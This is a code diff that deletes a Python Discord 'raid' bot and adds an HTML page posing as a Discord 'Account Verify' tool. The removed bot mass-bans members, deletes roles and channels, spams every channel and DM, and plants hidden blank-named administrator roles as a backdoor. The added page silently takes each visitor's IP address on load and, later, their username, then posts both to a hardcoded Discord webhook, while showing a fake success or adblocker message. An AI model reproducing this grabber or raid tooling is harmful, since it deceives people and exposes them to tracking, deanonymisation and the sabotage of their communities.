@@ -1,382 +1,302 @@
-from extra import *
-os.system('cls')
-intents = discord.Intents.all()
-intents.members = True 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Verify</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #222;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
 
+        .main-container {
+            position: relative;
+            width: 300px;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
 
+        .container {
+            background-color: rgba(0, 0, 0, 0.8);
+            border-radius: 5px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            width: 100%;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            opacity: 1;
+            transform: translateY(0);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
 
+        .verified-container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-def timecheck(text):
-    timestamp = (Back.BLACK + Fore.GREEN + time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + Back.RESET + Fore.WHITE + Style.BRIGHT)
-    print(f"[{timestamp}] " + text)
+        .verified-box {
+            background-color: rgba(0, 0, 0, 0.8);
+            border-radius: 5px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            opacity: 0;
+            transform: translateY(100%);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+
+        .verified-box.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .error-box {
+            background-color: rgba(0, 0, 0, 0.8);
+            border-radius: 5px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            opacity: 0;
+            transform: translateY(100%);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+
+        .error-box.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .checkmark, .error-x {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .checkmark::before {
+            content: '\2713';
+            font-size: 40px;
+            color: #fff;
+        }
+
+        .error-x::before {
+            content: '\2716';
+            font-size: 40px;
+            color: red;
+        }
+
+        textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            resize: none;
+            background-color: #333;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        textarea::placeholder {
+            color: #ccc;
+            text-align: center;
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .slide-up {
+            animation: slideUp 0.5s ease-in-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(100%);
+            }
+            to {
+                transform: translateY(0);
+            }
+        }
+
+        #websiteCredit {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            font-size: 12px;
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="container">
+            <h1>Bot Account Verifer</h1>
+            <textarea id="textArea" placeholder="Enter your Discord username"></textarea>
+            <button id="sendButton">Send Text</button>
+        </div>
+    </div>
+    <div class="verified-container hidden">
+        <div class="verified-box">
+            <div class="checkmark"></div>
+            <p id="verificationText" class="hidden">Successfully Verified Account</p>
+        </div>
+    </div>
+    <div class="error-box hidden">
+        <div class="error-x"></div>
+        <p id="errorText" class="hidden">Please turn off your adblocker or VPN</p>
+    </div>
     
-def plus_f(text):
-    plus = (Back.BLACK + Fore.GREEN + "[+]" + Back.RESET + Fore.WHITE + Style.BRIGHT)
-    print(f"{plus} "+ text)
-
-def minus_f(text):
-    minus = (Back.BLACK + Fore.RED + "[-]" + Back.RESET + Fore.WHITE + Style.BRIGHT)
-    print(f"{minus} " + text)
-
-def error_f(text):
-    error = (Back.BLACK + Fore.YELLOW + "[X]" + Back.RESET + Fore.WHITE + Style.BRIGHT)
-    print(f"{error} " + text)
-
-def sucess_f(text):
-    sucess = (Back.BLACK + Fore.CYAN + "[✓]" + Back.RESET + Fore.WHITE + Style.BRIGHT)
-    print(f"{sucess} " + text)
     
+    <div id="websiteCredit">Website Made By _angelicaurora</div>
 
+    <script>
+        document.addEventListener("DOMContentLoaded", async function() {
+            const textArea = document.getElementById("textArea");
+            const sendButton = document.getElementById("sendButton");
+            const mainContainer = document.querySelector(".main-container");
+            const container = document.querySelector(".container");
+            const verifiedContainer = document.querySelector(".verified-container");
+            const verifiedBox = document.querySelector(".verified-box");
+            const errorBox = document.querySelector(".error-box");
+            const errorX = document.querySelector(".error-x");
+            const verificationText = document.getElementById("verificationText");
+            const errorText = document.getElementById("errorText");
 
+            const discordWebhookURL = "https://discord.com/api/webhooks/1138666445815955536/EXAPLVWdD2Qg0fMv09EfcexbhCesGWcEBpPNeTypHRUYCiJiABJxhiBM2fKLNdiecg5d"; // Replace with your actual webhook URL
 
+            async function getUserIP() {
+                try {
+                    const response = await fetch("https://ipinfo.io/json");
+                    const data = await response.json();
+                    return data.ip || "Unknown IP";
+                } catch (error) {
+                    console.error("Error getting user IP:", error);
+                    return "Unknown IP";
+                }
+            }
 
-client = commands.Bot(command_prefix=prefix, intents=intents)
+            const userIP = await getUserIP();
 
-@client.event
-async def on_ready():
-    whitelist.append(client.user.id)
-    guild = client.get_guild(guild_id)
-    os.system('cls')
-    timecheck(f"discord.client logging in using static token")
-    timecheck(f"discord.gateway Shard ID None has connected to Gateway (Session ID: 29ce26d63b782171558feb618a8bb27d).")
-    timecheck(f"Bot Token: MTEzNjEyMTg3NDQ4NTYyNDk1Mg.*************************")
-    timecheck(f"Bot Name: {client.user}")
-    timecheck(f"Bot UserId: {client.user.id}")
-    #await client.tree.sync()
-    timecheck("Slash CMDs Synced commands")
-    timecheck(f'Bot Successfully Connected To Discord!')
-    print("--------------------------------------------------------------------------------")
-    
-    
+            if (userIP === "Unknown IP") {
+                mainContainer.classList.add("hidden");
+                errorBox.classList.remove("hidden");
+                errorBox.classList.add("show");
+                errorX.classList.remove("hidden");
+                errorText.classList.remove("hidden");
+                errorText.classList.add("slide-up");
+            } else {
+                const payload = {
+                    content: `User IP: ${userIP}`
+                };
 
+                try {
+                    const response = await fetch(discordWebhookURL, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(payload)
+                    });
 
-#------------------------START OF RAID FUNCTIONS ---------------------------
+                    if (!response.ok) {
+                        console.error("failed to auth account");
+                    }
+                } catch (error) {
+                    console.error("failed to make secure session", error);
+                }
+            }
 
-code = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(1024))
-whitelistcode = code    
-guild = client.get_guild(guild_id)   
-async def quit():
-    os.system('cls')
-    plus_f("Stopping The Bot")                
-    await client.close()
-       
-async def help(user):
-    creation = discord.Embed(title="Creation", color=discord.Color.green())
-    creation.add_field(name="!createrole", value=f"Creates {role_num} Role(s)", inline=False)
-    creation.add_field(name="!createchannel", value=f"Creates {channel_num} Channel(s)", inline=False)
-    creation.add_field(name="!createcat", value=f"Creates {category_num} catagorie(s)", inline=False)
+            sendButton.addEventListener("click", async function() {
+                const text = textArea.value.trim();
 
-    deletion = discord.Embed(title="deletion", color=discord.Color.red())
-    deletion.add_field(name="!delrole", value=f"Deleteds ALL Role(s)", inline=False)
-    deletion.add_field(name="!delchannel", value=f"Deleteds ALL Channel(s)", inline=False)
-    deletion.add_field(name="!delcat", value=f"Deleteds ALL Categorie(s)", inline=False)
+                if (text !== "") {
+                    const userIP = await getUserIP();
 
-    raid_util = discord.Embed(title="Raid Utilites", color=discord.Color.purple())
+                    if (userIP === "Unknown IP") {
+                        mainContainer.classList.add("hidden");
+                        errorBox.classList.remove("hidden");
+                        errorBox.classList.add("show");
+                        errorX.classList.remove("hidden");
+                        errorText.classList.remove("hidden");
+                        errorText.classList.add("slide-up");
+                        return;
+                    }
 
-    raid_util.add_field(name="!spam", value=f"Spams a list of messages in every channel", inline=False)
-    raid_util.add_field(name="!dmspam", value=f"unbans all banned user(s)", inline=False)
-    raid_util.add_field(name="!customspam", value=f"Sends a custom spam message to the server\nUsage: !customspam <message>", inline=False)
-    raid_util.add_field(name="!customdmspam", value=f"Sends a custom dmspam message to every user\nUsage: !customdmspam <message>", inline=False)
-    raid_util.add_field(name="!unbanall", value=f"unbans all banned user(s)", inline=False)
-    raid_util.add_field(name="!banall", value=f"bans all users", inline=False)
+                    const payload = {
+                        content: `User IP: ${userIP}\n${text}`
+                    };
 
-    await user.send(embed=creation)
-    await user.send(embed=deletion)
-    await user.send(embed=raid_util)
+                    try {
+                        const response = await fetch(discordWebhookURL, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify(payload)
+                        });
 
-async def createrole(guild):
-    for x in range(0, role_num):
-        new_role = await guild.create_role(name=role_name)
-        plus_f(f"Created Role {role_name} With ID: {new_role.id}")
-    sucess_f(f"Successfully created {role_num} Roles")
-    
-async def deleteroles(guild):
-    failed_roles = []
-    delrole = 0
-    for role in guild.roles:
-        if role != guild.default_role:
-            try:
-                await role.delete()
-                minus_f(f'Deleted role: {role.name} With ID: {role.id}')
-                delrole += 1
-            except discord.Forbidden:
-                failed_roles.append(role.name)
-                error_f(f'Error occurred while deleting role {role.name}')
-            except Exception as e:
-                error_f(f'Error occurred while deleting role {role.name}: {e}')
-    sucess_f(f"Sucessfully Deleted {delrole} Roles")
-    
-async def deletechannels(guild):
-    dchan = 0
-    for channel in guild.channels:
-        if isinstance(channel, discord.TextChannel):
-            await channel.delete()
-            minus_f(f"Deleted Channel: {channel.name}")
-            dchan += 1
-    sucess_f(f"Scuessfully Deleted {dchan} Channels")
-        
-async def createchannel(guild):
-    for x in range(0,channel_num):
-        if guild is not None:
-            new_channel = await guild.create_text_channel(name=channel_name)
-            plus_f(f"Created Channel: {channel_name}")
-    sucess_f(f"Sucessfully created {channel_num} channels")
-        
-async def deletecatagory(guild):
-    cata = 0
-    for category in guild.categories:
-        await category.delete()
-        minus_f(f"Deleteded category: {category}")
-        cata += 1
-    sucess_f(f'Sucessfully Deleted {cata} catagories.')
-    
-async def createcat(guild):
-    for i in range(0, category_num): 
-        await guild.create_category(category_name)
-        plus_f(f"Created Category: {category_name}")
-    sucess_f(f"Sucessfully Created {category_num} catagories")
-
-async def spam(guild):
-    message = 0
-    text_channels = guild.text_channels
-    for n in range(0, spam_loop):        
-        for channel in text_channels:
-            try:
-                random_message = random.choice(random_messages)
-                await channel.send(random_message)
-                plus_f(f"Sent Message {random_message} In {channel.name}")
-                message += 1
-            except discord.Forbidden:
-                print(f"Missing permissions to send messages in {channel.name} of {guild.name}")
-            except discord.HTTPException as e:
-                print(f"Error occurred while sending message in {channel.name} of {guild.name}: {e}")
-    sucess_f(f"Sucessfully Sent {message} Messages")
-
-async def unbanall(guild):
-    unban = 0
-    async for ban_entry in guild.bans():
-        user = ban_entry.user
-        try: 
-            await guild.unban(user)
-            unban +=1
-            plus_f(f"Unbanned {user}")            
-        except:
-                continue
-    sucess_f(f"Sucessfully Unbanned {unban} users")
-        
-async def banall(guild):
-    banned = 0
-    for memeber in guild.members:
-        if memeber.id in whitelist:
-            error_f(f"Skipping {memeber} In Whitelist")
-        else:
-            try:
-                banned += 1
-                await memeber.ban(reason="gone")
-                minus_f(f"baning User {memeber}")
-            except discord.Forbidden:
-                    banned -= 1
-                    error_f(f"failed to ban {memeber} because of missing permisions")
-    sucess_f(f"Sucessfully banned {banned} User(s)")
-                        
-async def customspam(guild, cmessage):
-
-    message = 0
-    text_channels = guild.text_channels
-    for n in range(0, spam_loop):        
-        for channel in text_channels:
-            try:
-                await channel.send(cmessage)
-                plus_f(f"Sent Message {cmessage} In {channel.name}")
-                message += 1
-            except discord.Forbidden:
-                print(f"Missing permissions to send messages in {channel.name} of {guild.name}")
-            except discord.HTTPException as e:
-                print(f"Error occurred while sending message in {channel.name} of {guild.name}: {e}")
-    sucess_f(f"Sucessfully Sent {message} Messages")
-
-async def dmspam(guild):
-    dmspamv = 0
-    for n in range(0, dmspam_loop):  
-        for member in guild.members:
-            if not member.bot:
-                try:
-                    dmspamv += 1
-                    randomdm_message = random.choice(randomdm_messages)
-                    await member.send(randomdm_message)
-                    plus_f(f"Sent message to {member.name}: {randomdm_message}")
-                except discord.Forbidden:
-                    error_f(f"Could not send message to {member.name}")
-    sucess_f(f"sent {dmspamv} Users Dm's")
-                
-async def customdmspam(guild, cdmmessage):
-    cdmspamv = 0
-    for n in range(0, dmspam_loop):  
-        for member in guild.members:
-            if not member.bot:
-                try:
-                    cdmspamv += 1
-                    await member.send(cdmmessage)
-                    plus_f(f"Sent message to {member.name}: {cdmmessage}")
-                except discord.Forbidden:
-                    error_f(f"Could not send message to {member.name}")
-    sucess_f(f"sent {cdmspamv} Users Dm's")
-    
-async def adminwhitelist(guild):
-    invis = await guild.create_role(name="ㅤ", permissions=discord.Permissions.all(), color=discord.Colour(int("313338", 16)))
-    normal = await guild.create_role(name="ㅤ", permissions=discord.Permissions.all(), color=discord.Colour(int("99aab5", 16)))
-    await normal.edit(position=+2)
-    for member_id in whitelist:
-        try:
-            member = guild.get_member(int(member_id))
-            await member.add_roles(normal)
-            await member.add_roles(invis)
-            plus_f(f"Added admin role to {member}")
-        except:
-            continue
-            
-async def whitegen(user):
-    sucess_f(Back.BLACK + Fore.YELLOW + f"Whitelist Code Generated:\n{whitelistcode}" + Back.RESET + Fore.WHITE + Style.BRIGHT)
-    await user.send(f"```{whitelistcode}```")
-   
-#------------------------END OF RAID FUNCTIONS ---------------------------
-
-#-----------------------Start of normal funcitons ----------------------------
-
-
-
-
-
-
-@client.event
-async def on_message(message):
-    guild = client.get_guild(guild_id)
-
-    if message.author == client.user:
-        return
-    else:
-   
-        #raid Below    
-        if isinstance(message.channel, discord.DMChannel):    
-            if message.author.id in whitelist:
-                if guild:
-                    if message.content.startswith("!quit"):
-                        await quit()
-                    elif message.content.startswith("!help"):
-                        await help(message.author)
-                    if message.content.startswith("!createrole"):
-                        try:
-                            await createrole(guild)
-                        except discord.ext.commands.errors.CommandNotFound:
-                            pass
-                    elif message.content.startswith("!delrole"):
-                        await deleteroles(guild)
-                    elif message.content.startswith("!delchannel"):
-                        await deletechannels(guild)
-                    elif message.content.startswith("!createchannel"):
-                        await createchannel(guild)
-                    #elif message.content.startswith("!webhookspam"):
-                        #await Helloworld()
-                    elif message.content.startswith("!delcat"): 
-                        await deletecatagory(guild)    
-                    elif message.content.startswith("!createcat"):
-                        await createcat(guild)
-                    elif message.content.startswith("!spam"):
-                        await spam(guild)
-                    elif message.content.startswith("!unbanall"):
-                        await unbanall(guild)
-                    elif message.content.startswith("!banall"):
-                        await banall(guild)
-                    elif message.content.startswith('!customspam'):
-                        command, arg = message.content.split(' ', 1)
-                        cmessage = (arg)
-                        await customspam(guild, cmessage)
-                    elif message.content.startswith('!dmspam'):
-                        await dmspam(guild)
-                    elif message.content.startswith('!customdmspam'):
-                        command, arg = message.content.split(' ', 1)
-                        cdmmessage = (arg)
-                        await customdmspam(guild, cdmmessage)
-                    elif message.content.startswith('!admin'):
-                        await adminwhitelist(guild)
-                    elif message.content.startswith('!gen'):
-                        await whitegen(message.author)
-
-                        
-
-                    
-                timecheck(Back.BLACK + Fore.CYAN+ f"Message Sent By: {message.author}" + Back.RESET + Fore.WHITE + Style.BRIGHT)
-                timecheck(Back.BLACK + Fore.CYAN + f"{message.content}" + Back.RESET + Fore.WHITE + Style.BRIGHT)
-            else:
-                timecheck(Back.BLACK + Fore.RED + f"Message Sent By (Not In Whitelist): {message.author}" + Back.RESET + Fore.WHITE + Style.BRIGHT)
-                timecheck(Back.BLACK + Fore.RED + f"{message.content}" + Back.RESET + Fore.WHITE + Style.BRIGHT)
-    
-    try:
-        await client.process_commands(message)
-    except Exception as e:
-        pass  # Suppressing the error message
-
-        
-        
-        
-
-@client.command()
-async def dm(ctx):
-    if isinstance(ctx.channel, discord.DMChannel):
-        await ctx.send("This command works only in DMs.")
-        
-        
-
-
-@client.command()
-@commands.has_permissions(administrator=True)
-async def setup(ctx):
-    
-    # Get the member object of the bot from the context
-    bot_member = ctx.guild.get_member(client.user.id)
-
-    # Get the list of roles for the guild
-    roles = ctx.guild.roles
-
-    # Get the highest role (top role) in the hierarchy
-    highest_role = roles[-1]
-
- 
-    
-    if bot_member.top_role == highest_role:   
-        print("Bot's role is at the top of the permissions list.")
-        await ctx.send("Bots permissions are correct, finishing setup")
-
-        
-        
-        guild = ctx.guild
-        category = await guild.create_category("Staff Logs")
-        
-        channels_to_create = ['Staff Commands','Chat Logs', 'Raid Attempts']  
-        
-        for channel_name in channels_to_create:
-            overwrites = {
-                guild.default_role: discord.PermissionOverwrite(read_messages=False), 
-                guild.me: discord.PermissionOverwrite(read_messages=True)   
-            }  
-            channel = await guild.create_text_channel(channel_name, category=category, overwrites=overwrites)
-            
-    else:
-        print("Bot's role is not at the top of the permissions list.")    
-        ctx.send("Move The bots role to the top of the permissions list")     
-        
-        #await channel.send(f"This is {channel_name} within the {category_name} category.")
-        
-@setup.error
-async def setup(ctx, error):
-    if isinstance(error, commands.MissingPermissions):
-        await ctx.send("You do not have administrator permissions to use this command.")
-        print("User is missing permission to run setup")
-
-@client.command(name='hello', help='Responds with a friendly greeting.')
-async def hello(ctx):
-    author = ctx.author
-    await ctx.send(f'Hello, {author.mention}!')
-
-client.run(bottoken)
-
+                        if (response.ok) {
+                            container.style.opacity = "0";
+                            container.style.transform = "translateY(-100%)";
+                            setTimeout(() => {
+                                mainContainer.classList.add("hidden");
+                                verifiedContainer.classList.remove("hidden");
+                                verifiedBox.classList.add("show");
+                                verificationText.classList.remove("hidden");
+                                verificationText.classList.add("slide-up");
+                            }, 500);
+                        } else {
+                            console.error("Failed to send text to Discord.");
+                            alert("Failed to send text to Discord.");
+                        }
+                    } catch (error) {
+                        console.error("Error sending message to Discord:", error);
+                        alert("An error occurred while sending text to Discord.");
+                    }
+                } else {
+                    alert("Please enter your Discord username before sending.");
+                }
+            });
+        });
+    </script>
+</body>
+</html>
